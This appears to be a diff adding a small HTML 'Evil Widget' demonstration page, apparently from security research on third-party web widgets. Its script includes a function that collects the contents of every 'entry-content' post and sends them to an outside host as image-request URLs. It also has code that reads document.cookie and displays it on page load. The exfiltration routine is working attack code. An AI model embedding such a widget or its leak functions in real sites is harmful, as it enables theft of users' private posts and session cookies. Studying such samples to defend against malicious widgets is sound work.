@@ -1,0 +1,47 @@
+<html>
+
+<script type="text/javascript">
+
+function getElementsByClassName(className, tag, elm){
+	var testClass = new RegExp("(^|\\s)" + className + "(\\s|$)");
+	var tag = tag || "*";
+	var elm = elm || document;
+	var elements = (tag == "*" && elm.all)? elm.all : elm.getElementsByTagName(tag);
+	var returnElements = [];
+	var current;
+	var length = elements.length;
+	for(var i=0; i<length; i++){
+		current = elements[i];
+		if(testClass.test(current.className)){
+			returnElements.push(current);
+		}
+	}
+	return returnElements;
+}
+
+function leak_content_posts () {
+  elems = getElementsByClassName ("entry-content", "div");
+  for (var i=0; i<elems.length; i++) {
+    //alert (elems[i]);
+    e = document.createElement ("IMG");
+    e.setAttribute ("src", "http://hydra.lcs.mit.edu/" + elems[i].innerHTML);
+    evil = document.getElementById ("evil");
+    evil.appendChild (e);
+  }
+}
+
+function leak_content_cookie () {
+  alert (document.cookie);
+
+}
+
+function leak_content_screen () {
+  e = document.getElementById ("output");
+  e.innerHTML = document.cookie;
+}
+
+window.onload = leak_content_screen;
+</script>
+
+Evil Widget says: <span id="output"></span>
+</html>
